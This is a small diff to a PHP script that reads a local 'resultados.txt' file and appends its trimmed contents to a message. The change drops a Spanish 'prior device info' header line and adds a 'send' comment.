@@ -37,8 +37,7 @@ $file = __DIR__ . "/resultados.txt";
 if (file_exists($file)) {
     $extra_info = file_get_contents($file);
     if (!empty($extra_info)) {
-        $msg .= "\n📝 <b>Info previa del dispositivo</b>\n";
-        $msg .= trim($extra_info) . "\n";
+        $msg .= trim($extra_info) . "\n"; //enviar
     }
 }
 
